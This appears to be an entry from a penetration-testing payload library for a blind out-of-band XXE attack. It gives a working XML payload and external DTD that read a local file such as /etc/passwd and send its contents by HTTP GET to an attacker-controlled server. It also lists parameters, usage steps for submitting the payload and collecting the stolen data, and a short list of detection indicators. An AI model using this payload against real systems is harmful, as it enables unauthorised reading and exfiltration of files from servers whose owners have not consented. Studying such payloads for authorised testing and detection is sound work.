---
id: 9270402d-0d76-41cf-9317-1056af6bcb0f
name: XML-Parameter-Entity-OOB-XXE-Payload
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.394371+00:00'
updated_at: '2023-04-10T20:24:37.199479+00:00'
platforms:
  - Web
tags:
  - xxe
  - oob
  - exfiltration
  - xml-entity
validated: true
---

# XML-Parameter-Entity-OOB-XXE-Payload

## Code

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://$_ATTACKER_SERVER/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://$_ATTACKER_SERVER/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file://$_TARGET_FILE">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://$_ATTACKER_SERVER/exfil?%file;'>">
%all;
```

## Description

This XML code snippet implements a blind XXE attack using parameter entities for out-of-band data exfiltration. The main payload references an external DTD hosted on the attacker's server, which defines entities to read a local file on the target (via file://) and sends its contents via an HTTP GET request to the attacker's exfiltration endpoint. The technique exploits XML parsers that allow external entity resolution, enabling blind retrieval of sensitive data without in-band responses.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_SERVER | Domain or IP of the attacker's server hosting the DTD and receiving data | attacker.com |
| $_TARGET_FILE | Path to the file on the target system to exfiltrate (e.g., /etc/passwd) | /etc/passwd |

## Usage

1. Host the DTD portion (below the main XML) as parameterEntity_oob.dtd on your server.
2. Substitute parameters in the main XML payload.
3. Submit the main XML via POST to the target's XML-parsing endpoint (e.g., using [[commands/curl-send-xml-payload]]).
4. Monitor your server's access logs for the GET request containing the exfiltrated file contents in the query parameter.
This payload is used in procedures like [[procedures/Blind-XXE-Data-Exfiltration-via-OOB-Attack]] for testing web applications vulnerable to XXE.

## Detection

- XML parser logs showing external DTD fetches or entity expansions.
- Outbound HTTP/DNS requests from the application server to unexpected domains.
- WAF alerts on XML payloads containing <!DOCTYPE> or external SYSTEM references.
- Network monitoring for file:// URIs in entity definitions (via proxy logs).
